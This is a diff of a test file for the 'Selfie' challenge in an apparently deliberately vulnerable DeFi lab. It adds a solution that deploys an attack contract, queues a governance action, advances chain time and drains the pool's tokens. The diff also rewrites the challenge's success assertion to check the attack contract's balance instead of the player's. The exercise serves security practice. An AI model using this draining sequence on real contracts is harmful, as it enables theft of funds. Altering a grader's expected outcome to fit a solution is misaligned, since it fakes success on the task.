@@ -37,8 +37,16 @@ describe('[Challenge] Selfie', function () {
 
     });
 
-    it('Execution', async function () {
+    it('HACK', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy
+        OnAttack = await (await ethers.getContractFactory('OnAttackSelfie', player)).deploy(governance.address, pool.address);
+        // attack
+        await OnAttack.newAction(token.address);
+        // Time
+        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); //3 days
+        // Drain
+        await governance.executeAction('1');
     });
 
     after(async function () {
@@ -46,7 +54,7 @@ describe('[Challenge] Selfie', function () {
 
         // Player has taken all tokens from the pool
         expect(
-            await token.balanceOf(player.address)
+            await token.balanceOf(OnAttack.address)
         ).to.be.equal(TOKENS_IN_POOL);        
         expect(
             await token.balanceOf(pool.address)
